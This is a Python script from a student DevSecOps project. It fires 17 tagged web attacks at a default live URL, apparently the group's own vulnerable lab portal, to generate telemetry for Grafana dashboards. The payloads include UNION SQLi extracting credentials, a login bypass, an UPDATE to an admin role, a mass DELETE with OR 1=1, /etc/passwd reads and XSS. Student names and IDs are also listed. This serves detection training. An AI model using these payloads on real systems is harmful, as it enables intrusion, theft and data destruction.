# -*- coding: utf-8 -*-
"""
KỊCH BẢN THỰC NGHIỆM KIỂM THỬ AN NINH VÀ PHÁT THẢI TELEMETRY THEO THÀNH VIÊN
Dự án: DevSecOps InlaneWeb Logistics Portal (Nhóm 11 - SEC4342)
Mục đích:
  - Tự động hóa gửi các kịch bản kiểm thử (17 kịch bản SQLi, LFI, XSS, Probe)
    được phân bổ chính xác theo từng thành viên trong nhóm.
  - INJECT ĐỊNH DANH THÀNH VIÊN (NAMNG, HAIND, MANHDX, ANHLD, MAIPN) vào Request:
    + URL Query String: ?member=NAMNG&tester=... (Hiển thị ngay tại trường 'query' của Apache Log)
    + SQL / Attack Payload: /* [MEMBER: NAMNG] */ (Hiển thị trong chuỗi khai thác và error log)
    + User-Agent Header: [DevSecOps-Audit/NAMNG-NguyenGiangNam] (Hiển thị tại trường 'user_agent')
    + Referer & Custom Headers: X-Audit-Member: NAMNG
  - Giúp giám sát viên / giảng viên quan sát và lọc tức thời trên Grafana Loki Dashboard:
    Truy vấn LogQL: {container="ilfreight_web"} |= "NAMNG"
"""

from __future__ import annotations

import argparse
import json
import os
import sys
import time
from urllib.parse import quote, urljoin, urlparse, parse_qs, urlencode
import urllib.request
import urllib.error

# Kích hoạt bảng mã UTF-8 cho console Windows
if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8")
if hasattr(sys.stderr, "reconfigure"):
    sys.stderr.reconfigure(encoding="utf-8")

# Danh mục 5 thành viên Nhóm 11 và ma trận phân bổ nhiệm vụ
MEMBERS = {
    "namng": {
        "tag": "NAMNG",
        "name": "Nguyễn Giang Nam",
        "student_id": "B26CHAT030",
        "role": "Trưởng nhóm / Kiến trúc sư DevSecOps & Security Lead",
        "cases": ["V1", "V14", "V16", "V17"],
        "aliases": ["nam", "namng", "nguyengiangnam", "b26chat030"]
    },
    "haind": {
        "tag": "HAIND",
        "name": "Nguyễn Đình Hải",
        "student_id": "B26CHAT025",
        "role": "Kỹ sư An toàn Bảo mật (Security Engineer)",
        "cases": ["V2", "V3", "V4"],
        "aliases": ["hai", "haind", "nguyendinhhai", "b26chat025"]
    },
    "manhdx": {
        "tag": "MANHDX",
        "name": "Đào Xuân Mạnh",
        "student_id": "B26CHAT029",
        "role": "Kỹ sư DevSecOps & Kiểm định Chất lượng (QA)",
        "cases": ["V11", "V13", "V15"],
        "aliases": ["manh", "manhdx", "daoxuanmanh", "b26chat029"]
    },
    "anhld": {
        "tag": "ANHLD",
        "name": "Lê Đức Anh",
        "student_id": "B26CHAT003",
        "role": "Kỹ sư Tự động hoá Hạ tầng (Infrastructure Automation)",
        "cases": ["V5", "V6", "V7"],
        "aliases": ["anh", "anhld", "leducanh", "b26chat003"]
    },
    "maipn": {
        "tag": "MAIPN",
        "name": "Nguyễn Phương Mai",
        "student_id": "B26CHAT028",
        "role": "Kỹ sư Giám sát & Vận hành SecOps (Observability Lead)",
        "cases": ["V8", "V9", "V10", "V12"],
        "aliases": ["mai", "maipn", "nguyenphuongmai", "b26chat028"]
    }
}

# Danh mục 17 kịch bản kiểm thử an ninh chuẩn hóa từ writeup.md + các lỗi mở rộng
TEST_SUITES = [
    # --- PHÂN HỆ NGUYỄN GIANG NAM (NAMNG) ---
    {
        "id": "V1",
        "owner": "namng",
        "name": "In-band UNION-based SQLi (Ports search)",
        "method": "GET",
        "path": "/ports",
        "params": {"q": "cn' UNION SELECT 1, username, password, email FROM users /* [MEMBER: NAMNG] */-- -"},
        "data": None,
        "panel": "Panel 2: SQL Injection (SQLi) Attacks in HTTP Traffic",
        "desc": "Thực nghiệm tiêm UNION SELECT trích xuất tài khoản người dùng tại ports.php"
    },
    {
        "id": "V14",
        "owner": "namng",
        "name": "News Portal UNION Data Extraction",
        "method": "GET",
        "path": "/news",
        "params": {"id": "1' UNION SELECT 1, username, password, email FROM users /* [MEMBER: NAMNG] */-- -"},
        "data": None,
        "panel": "Panel 2: SQL Injection (SQLi) Attacks in HTTP Traffic",
        "desc": "Thực nghiệm trích xuất tài khoản qua cổng tin tức công cộng news.php"
    },
    {
        "id": "V16",
        "owner": "namng",
        "name": "Reflected Cross-Site Scripting (XSS)",
        "method": "GET",
        "path": "/ports",
        "params": {"q": "<script>/* [MEMBER: NAMNG] */ alert('DevSecOps-NAMNG-Verification')</script>"},
        "data": None,
        "panel": "Panel 4: Cross-Site Scripting (XSS) in HTTP Traffic",
        "desc": "Thực nghiệm chèn thẻ script kiểm tra bộ lọc mã độc phản xạ tại ô tìm kiếm"
    },
    {
        "id": "V17",
        "owner": "namng",
        "name": "Sensitive Configuration File Probe",
        "method": "GET",
        "path": "/.env",
        "params": {},
        "data": None,
        "panel": "Panel 6: HTTP Error-Based Response Leaks & 4xx/5xx Server Faults",
        "desc": "Thực nghiệm dò quét tệp cấu hình bí mật môi trường .env"
    },

    # --- PHÂN HỆ NGUYỄN ĐÌNH HẢI (HAIND) ---
    {
        "id": "V2",
        "owner": "haind",
        "name": "In-band Error-based XPath SQLi (Port detail)",
        "method": "GET",
        "path": "/ports/CNSHA",
        "params": {"code": "CNSHA' AND extractvalue(1,concat(0x7e,(SELECT database()))) /* [MEMBER: HAIND] */-- -"},
        "data": None,
        "panel": "Panel 1: Application Cause Exceptions & Runtime Stacktraces",
        "desc": "Thực nghiệm ép lỗi cú pháp XPath extractvalue để lộ tên CSDL"
    },
    {
        "id": "V3",
        "owner": "haind",
        "name": "Boolean-based SQLi Auth Bypass (Login form)",
        "method": "POST",
        "path": "/login",
        "params": {},
        "data": "username=admin%27+%2F*+%5BMEMBER%3A+HAIND%5D+*%2F--+-&password=dummy_password",
        "panel": "Panel 2: SQL Injection (SQLi) Attacks in HTTP Traffic",
        "desc": "Thực nghiệm vượt qua xác thực bằng kỹ thuật ngắt chuỗi SQL admin'-- -"
    },
    {
        "id": "V4",
        "owner": "haind",
        "name": "Time-based Blind SQLi (Tracking API)",
        "method": "GET",
        "path": "/api/track",
        "params": {"tracking": "ILF1042CN' AND SLEEP(3) /* [MEMBER: HAIND] */-- -"},
        "data": None,
        "panel": "Panel 2: SQL Injection (SQLi) Attacks in HTTP Traffic",
        "desc": "Thực nghiệm suy diễn dữ liệu bằng độ trễ SLEEP(3) trên API tra cứu vận đơn"
    },

    # --- PHÂN HỆ ĐÀO XUÂN MẠNH (MANHDX) ---
    {
        "id": "V15",
        "owner": "manhdx",
        "name": "Local File Inclusion Probe (Path Traversal)",
        "method": "GET",
        "path": "/index.php",
        "params": {"page": "../../../../etc/passwd", "audit_note": "[MEMBER: MANHDX]"},
        "data": None,
        "panel": "Panel 3: Path Traversal & Local File Inclusion (LFI/RFI) in HTTP Traffic",
        "desc": "Thực nghiệm duyệt đường dẫn thư mục leo thang LFI đọc /etc/passwd"
    },
    {
        "id": "V13",
        "owner": "manhdx",
        "name": "Sensitive File Read Attempt (LOAD_FILE)",
        "method": "GET",
        "path": "/reports/down",
        "params": {"file": "' UNION SELECT LOAD_FILE('/etc/passwd'),2,3,4 /* [MEMBER: MANHDX] */-- -"},
        "data": None,
        "panel": "Panel 3: Path Traversal & Local File Inclusion (LFI/RFI) in HTTP Traffic",
        "desc": "Thực nghiệm đọc tệp nhạy cảm hệ điều hành qua hàm LOAD_FILE"
    },
    {
        "id": "V11",
        "owner": "manhdx",
        "name": "Multi-Query CTAS Table Duplication",
        "method": "POST",
        "path": "/admin/export",
        "params": {},
        "data": "report_name=audit_leak_MANHDX+AS+SELECT+*+FROM+users+%2F*+%5BMEMBER%3A+MANHDX%5D+*%2F--+-",
        "panel": "Panel 2: SQL Injection (SQLi) Attacks in HTTP Traffic",
        "desc": "Thực nghiệm lợi dụng CREATE TABLE sao chép toàn bộ dữ liệu bảng users"
    },

    # --- PHÂN HỆ LÊ ĐỨC ANH (ANHLD) ---
    {
        "id": "V5",
        "owner": "anhld",
        "name": "Order-By Clause Injection (Account shipments)",
        "method": "GET",
        "path": "/account",
        "params": {"order": "(CASE WHEN (1=1) THEN tracking_no ELSE id END) /* [MEMBER: ANHLD] */"},
        "data": None,
        "panel": "Panel 2: SQL Injection (SQLi) Attacks in HTTP Traffic",
        "desc": "Thực nghiệm chèn biểu thức điều kiện vào mệnh đề ORDER BY trong account.php"
    },
    {
        "id": "V6",
        "owner": "anhld",
        "name": "UPDATE Statement Privilege Escalation",
        "method": "POST",
        "path": "/account/update",
        "params": {},
        "data": "email=test%40inlane.vn%27%2C+role%3D%27admin%27+%2F*+%5BMEMBER%3A+ANHLD%5D+*%2F+WHERE+username%3D%27jsmith%27--+-",
        "panel": "Panel 2: SQL Injection (SQLi) Attacks in HTTP Traffic",
        "desc": "Thực nghiệm tiêm câu lệnh UPDATE nâng quyền tài khoản người dùng"
    },
    {
        "id": "V7",
        "owner": "anhld",
        "name": "Numeric SQL Injection (Shipment detail)",
        "method": "GET",
        "path": "/shipments/1",
        "params": {"id": "1 UNION SELECT 1, tracking_no, status, origin, destination FROM shipments /* [MEMBER: ANHLD] */-- -"},
        "data": None,
        "panel": "Panel 2: SQL Injection (SQLi) Attacks in HTTP Traffic",
        "desc": "Thực nghiệm tiêm mã SQL trên tham số dạng số nguyên id"
    },

    # --- PHÂN HỆ NGUYỄN PHƯƠNG MAI (MAIPN) ---
    {
        "id": "V8",
        "owner": "maipn",
        "name": "INSERT Statement Error-based SQLi (Comments)",
        "method": "POST",
        "path": "/comments",
        "params": {},
        "data": "content=comment_test%27||(SELECT+extractvalue(1%2Cconcat(0x7e%2C(SELECT+version()))))+%2F*+%5BMEMBER%3A+MAIPN%5D+*%2F||%27",
        "panel": "Panel 1: Application Cause Exceptions & Runtime Stacktraces",
        "desc": "Thực nghiệm tiêm chuỗi ép lỗi trong mệnh đề INSERT bình luận"
    },
    {
        "id": "V9",
        "owner": "maipn",
        "name": "DELETE Statement Mass Removal SQLi",
        "method": "POST",
        "path": "/comments/del",
        "params": {},
        "data": "comment_id=0+OR+1%3D1+%2F*+%5BMEMBER%3A+MAIPN%5D+*%2F",
        "panel": "Panel 2: SQL Injection (SQLi) Attacks in HTTP Traffic",
        "desc": "Thực nghiệm tiêm điều kiện luôn đúng OR 1=1 trong câu lệnh xóa dữ liệu"
    },
    {
        "id": "V10",
        "owner": "maipn",
        "name": "Admin Portal User Enumeration",
        "method": "GET",
        "path": "/admin",
        "params": {"search": "' UNION SELECT id, username, email, role FROM users /* [MEMBER: MAIPN] */-- -"},
        "data": None,
        "panel": "Panel 2: SQL Injection (SQLi) Attacks in HTTP Traffic",
        "desc": "Thực nghiệm dò quét bảng tài khoản khách hàng trên cổng quản trị"
    },
    {
        "id": "V12",
        "owner": "maipn",
        "name": "Stacked Multi-Query Command (Console)",
        "method": "GET",
        "path": "/admin/console",
        "params": {"filter": "status FROM shipments; INSERT INTO audit_log(action) VALUES('simulated_attack_MAIPN') /* [MEMBER: MAIPN] */-- -"},
        "data": None,
        "panel": "Panel 2: SQL Injection (SQLi) Attacks in HTTP Traffic",
        "desc": "Thực nghiệm ghép đa lệnh ngăn cách bằng dấu chấm phẩy (;) trên console quản trị"
    }
]

def resolve_member(input_mem: str | None) -> dict | None:
    """Xác định thông tin thành viên dựa trên alias hoặc mã nhập vào"""
    if not input_mem:
        return None
    key = input_mem.strip().lower()
    if key == "all":
        return {"tag": "ALL", "name": "Toàn bộ thành viên nhóm", "cases": [t["id"] for t in TEST_SUITES]}
    for m_k, m_info in MEMBERS.items():
        if key == m_k or key == m_info["tag"].lower() or key in m_info["aliases"]:
            return m_info
    return None

def strip_accents(text: str) -> str:
    """Chuyển đổi chuỗi tiếng Việt có dấu thành không dấu để an toàn tuyệt đối với HTTP Header (Latin-1)"""
    import unicodedata
    normalized = unicodedata.normalize('NFD', text)
    shaved = ''.join(c for c in normalized if unicodedata.category(c) != 'Mn')
    return shaved.replace('đ', 'd').replace('Đ', 'D')

def send_request(base_url: str, test_case: dict, member_info: dict | None, timeout: int = 10) -> tuple[int, float, str, str]:
    """
    Gửi HTTP Request và INJECT ĐỊNH DANH THÀNH VIÊN vào cả:
    1. Query String (?member=NAMNG&tester=Nguyen_Giang_Nam)
    2. Body Payload (cho POST request: &member=NAMNG)
    3. User-Agent Header (Mozilla/5.0... [DevSecOps-Audit/NAMNG-NguyenGiangNam])
    4. Referer & Custom Headers (X-Audit-Member: NAMNG)
    """
    path = test_case["path"]
    method = test_case["method"]
    params = dict(test_case.get("params", {}))
    data = test_case.get("data")
    
    # Xác định tag và tên thành viên
    if member_info and member_info.get("tag") != "ALL":
        mem_tag = member_info["tag"]
        mem_name = member_info["name"]
    else:
        owner_key = test_case.get("owner", "namng")
        owner_info = MEMBERS.get(owner_key, MEMBERS["namng"])
        mem_tag = owner_info["tag"]
        mem_name = owner_info["name"]

    ascii_name = strip_accents(mem_name)

    # 1. Inject định danh vào URL Query Params để xuất hiện trong trường 'query' của Apache Log
    params["member"] = mem_tag
    params["tester"] = ascii_name.replace(" ", "_")

    url = urljoin(base_url, path)
    if params:
        query_string = "&".join(f"{quote(k)}={quote(str(v))}" for k, v in params.items())
        sep = "&" if "?" in url else "?"
        url = f"{url}{sep}{query_string}"

    # 2. Xây dựng User-Agent chứa định danh thành viên để trường 'user_agent' trên Grafana bắt rõ
    clean_name = ascii_name.replace(" ", "")
    user_agent_str = (
        f"Mozilla/5.0 (Windows NT 10.0; Win64; x64; Member/{mem_tag}) "
        f"AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 "
        f"[DevSecOps-Audit/{mem_tag}-{clean_name}]"
    )

    headers = {
        "User-Agent": user_agent_str,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,application/json,*/*;q=0.8",
        "Referer": f"{base_url}/?audit_member={mem_tag}",
        "X-Audit-Member": mem_tag,
        "X-DevSecOps-Tester": f"{ascii_name} ({mem_tag})"
    }

    body_bytes = None
    if method == "POST":
        headers["Content-Type"] = "application/x-www-form-urlencoded"
        # 3. Inject thêm vào POST body data
        if data:
            post_data = f"{data}&member={quote(mem_tag)}&tester={quote(ascii_name)}"
            body_bytes = post_data.encode("utf-8")
        else:
            post_data = f"member={quote(mem_tag)}&tester={quote(ascii_name)}"
            body_bytes = post_data.encode("utf-8")

    req = urllib.request.Request(url, data=body_bytes, headers=headers, method=method)

    start_time = time.time()
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            elapsed = time.time() - start_time
            return resp.status, elapsed, "SUCCESS", url
    except urllib.error.HTTPError as e:
        elapsed = time.time() - start_time
        return e.code, elapsed, f"HTTP_{e.code}", url
    except urllib.error.URLError as e:
        elapsed = time.time() - start_time
        return 0, elapsed, f"CONN_ERR: {e.reason}", url
    except Exception as e:
        elapsed = time.time() - start_time
        return 0, elapsed, f"ERR: {str(e)}", url

def main():
    parser = argparse.ArgumentParser(
        description="DevSecOps Security & Telemetry Generator (Kích hoạt Bug theo Thành viên)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Ví dụ sử dụng:
  python simulate_telemetry.py --mem namng          # Kích hoạt toàn bộ bug của Nguyễn Giang Nam & inject NAMNG
  python simulate_telemetry.py --mem haind          # Kích hoạt toàn bộ bug của Nguyễn Đình Hải & inject HAIND
  python simulate_telemetry.py --mem manhdx         # Kích hoạt toàn bộ bug của Đào Xuân Mạnh & inject MANHDX
  python simulate_telemetry.py --mem anhld          # Kích hoạt toàn bộ bug của Lê Đức Anh & inject ANHLD
  python simulate_telemetry.py --mem maipn          # Kích hoạt toàn bộ bug của Nguyễn Phương Mai & inject MAIPN
  python simulate_telemetry.py --mem all            # Kích hoạt toàn bộ 17 bug của cả 5 thành viên
  python simulate_telemetry.py --mem namng --repeat 3   # Bắn 3 vòng tạo xung nhịp (Spike) rõ nét trên Grafana
        """
    )
    parser.add_argument("--mem", "--member", dest="mem", default=None,
                        help="Tên định danh thành viên cần diễn tập (namng, haind, manhdx, anhld, maipn hoặc all)")
    parser.add_argument("--base-url", default="https://inlaneweb.ecotools.online",
                        help="Địa chỉ cổng InlaneWeb mục tiêu (mặc định: https://inlaneweb.ecotools.online)")
    parser.add_argument("--delay", type=float, default=1.5,
                        help="Thời gian giãn cách giữa các yêu cầu (giây) để quan sát Grafana (mặc định: 1.5s)")
    parser.add_argument("--cases", nargs="*", default=None,
                        help="Danh sách mã kịch bản cần chạy lẻ (ví dụ: V1 V14). Bỏ trống để chạy toàn bộ của thành viên.")
    parser.add_argument("--repeat", type=int, default=1,
                        help="Số vòng lặp diễn tập để tạo xung nhịp (spike) trên biểu đồ (mặc định: 1)")

    args = parser.parse_args()
    base_url = args.base_url.rstrip("/")

    # Xác định thành viên được chỉ định
    mem_info = resolve_member(args.mem)
    if not mem_info:
        print("=" * 80)
        print(" [CHÚ Ý] Bạn chưa chỉ định thành viên qua tham số --mem.")
        print(" Các lựa chọn khả dụng:")
        for k, v in MEMBERS.items():
            print(f"   * --mem {k:<8} -> {v['name']} ({v['tag']}) | {len(v['cases'])} bugs: {', '.join(v['cases'])}")
        print("   * --mem all      -> Chạy toàn bộ 17 bugs của cả 5 thành viên")
        print("=" * 80)
        # Mặc định fallback chạy all nếu người dùng không truyền
        mem_info = {"tag": "ALL", "name": "Toàn bộ nhóm", "cases": [t["id"] for t in TEST_SUITES]}

    # Lọc danh sách test case
    if mem_info["tag"] == "ALL":
        target_cases = [t["id"] for t in TEST_SUITES]
    else:
        target_cases = mem_info["cases"]

    if args.cases:
        target_cases = [c for c in target_cases if c in args.cases]

    selected_tests = [t for t in TEST_SUITES if t["id"] in target_cases]

    print("=" * 80)
    print(" HỆ THỐNG PHÁT THẢI TELEMETRY AN NINH THEO THÀNH VIÊN — DEVSECOPS INLANEWEB")
    print(f" Cổng mục tiêu : {base_url}")
    if mem_info["tag"] != "ALL":
        print(f" Thành viên    : {mem_info['name'].upper()} (Mã: {mem_info['tag']} | MSSV: {mem_info['student_id']})")
        print(f" Vai trò       : {mem_info['role']}")
        print(f" Phân hệ bug   : {', '.join(target_cases)} ({len(selected_tests)} kịch bản)")
        print(f" Dấu vết Inject: [MEMBER: {mem_info['tag']}] đã được ghim vào URL, Payload, Header, Referer")
    else:
        print(f" Chế độ        : TOÀN BỘ 5 THÀNH VIÊN ({len(selected_tests)} kịch bản)")
    print(f" Cấu hình phát : Giãn cách {args.delay}s/yêu cầu | Lặp {args.repeat} vòng")
    print("=" * 80)
    print()

    results = []
    total_count = len(selected_tests) * args.repeat
    current_idx = 0

    for round_num in range(1, args.repeat + 1):
        if args.repeat > 1:
            print(f"\n--- [VÒNG DIỄN TẬP {round_num}/{args.repeat}] ---")

        for t in selected_tests:
            current_idx += 1
            t_id = t["id"]
            name = t["name"]
            panel = t["panel"]
            owner = t.get("owner", "namng")
            curr_mem = mem_info if mem_info["tag"] != "ALL" else MEMBERS.get(owner, MEMBERS["namng"])
            tag = curr_mem["tag"]

            print(f"[{current_idx:02d}/{total_count:02d}] Đang gửi kịch bản {t_id} [{tag}]: {name}...")
            print(f"       -> Phương thức : {t['method']} {t['path']}")
            print(f"       -> Mục tiêu Grafana : {panel}")

            status_code, latency, msg, executed_url = send_request(base_url, t, curr_mem)

            status_str = f"Mã HTTP {status_code}" if status_code > 0 else msg
            print(f"       -> URL thực thi: {executed_url}")
            print(f"       => Kết quả: {status_str} | Thời gian: {latency:.2f}s | Đã gắn tag: {tag}")
            print()

            results.append({
                "id": t_id,
                "tag": tag,
                "name": name,
                "panel": panel,
                "status": status_code,
                "latency_sec": round(latency, 2),
                "desc": t["desc"]
            })

            time.sleep(args.delay)

    print("\n" + "=" * 80)
    print(" TỔNG KẾT DIỄN TẬP PHÁT THẢI TELEMETRY THÀNH CÔNG")
    print("=" * 80)
    print(f"{'Mã':<5} | {'Tag':<7} | {'Tên kịch bản':<33} | {'HTTP':<6} | {'Độ trễ':<7} | {'Mục tiêu Grafana'}")
    print("-" * 80)
    for r in results:
        code_disp = str(r["status"]) if r["status"] > 0 else "ERR"
        print(f"{r['id']:<5} | {r['tag']:<7} | {r['name'][:33]:<33} | {code_disp:<6} | {r['latency_sec']:<5}s | {r['panel']}")

    print("\n" + "=" * 80)
    print(" [HƯỚNG DẪN QUAN SÁT VÀ MINH CHỨNG TRÊN GRAFANA LOKI DASHBOARD]:")
    if mem_info["tag"] != "ALL":
        tag = mem_info["tag"]
        print(f"1. Mở Grafana Dashboard (8 Panels) tại: https://grafana.inlaneweb.io.vn")
        print(f"2. Trong ô tìm kiếm LogQL, nhập câu truy vấn sau để LỌC RIÊNG BẢN GHI CỦA {tag}:")
        print(f"      {{container=\"ilfreight_web\"}} |= \"{tag}\"")
        print(f"   Hoặc lọc qua trường query / user_agent đã inject:")
        print(f"      {{container=\"ilfreight_web\"}} |~ \"(?i)member.*{tag}\"")
        print(f"3. Quan sát các Panels tương ứng để thấy các đỉnh phát xạ (Spikes) và dòng log chứa [{tag}].")
        print(f"4. Chụp ảnh màn hình làm minh chứng đưa vào Báo cáo Bài tập lớn (Chương 4).")
    else:
        print("1. Mở Grafana Dashboard và chọn khung thời gian 'Last 15 minutes'.")
        print("2. Lọc theo từng thành viên bằng cách gõ: {container=\"ilfreight_web\"} |= \"NAMNG\" (hoặc HAIND, MANHDX, ANHLD, MAIPN).")
        print("3. Kiểm tra các panels: SQLi (Panel 2), LFI (Panel 3), XSS (Panel 4), Error (Panel 1/6).")
    print("=" * 80)

if __name__ == "__main__":
    main()
